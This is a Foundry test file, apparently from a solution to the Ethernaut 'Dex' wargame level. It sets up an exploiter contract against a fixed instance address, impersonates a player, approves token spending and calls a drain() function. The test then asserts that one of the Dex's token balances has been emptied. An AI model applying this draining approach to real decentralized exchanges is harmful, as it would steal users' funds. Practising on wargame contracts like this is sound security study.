// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import "../src/22-Dex.sol";

contract DexTest is Test {
    IDex public dexInstance;
    Dex public exploiter;
    address public token1;
    address public token2;

    function setUp() public {
        address instanceAddress = 0x7e00c95Bc3FACC8a12c387B1Aa31062a07449406;
        dexInstance = IDex(instanceAddress);
        exploiter = new Dex(instanceAddress);
        token1 = dexInstance.token1();
        token2 = dexInstance.token2();
    }

    function test_drain() public {
        vm.startPrank(0xBF8641831D15c2701BA122981C3D7A6A2533ea48, 0xBF8641831D15c2701BA122981C3D7A6A2533ea48);
        IERC20(token1).approve(address(exploiter), type(uint256).max);
        IERC20(token2).approve(address(exploiter), type(uint256).max);
        exploiter.drain();
        assert(
            IERC20(token1).balanceOf(address(dexInstance)) == 0 || IERC20(token2).balanceOf(address(dexInstance)) == 0
        );
    }
}
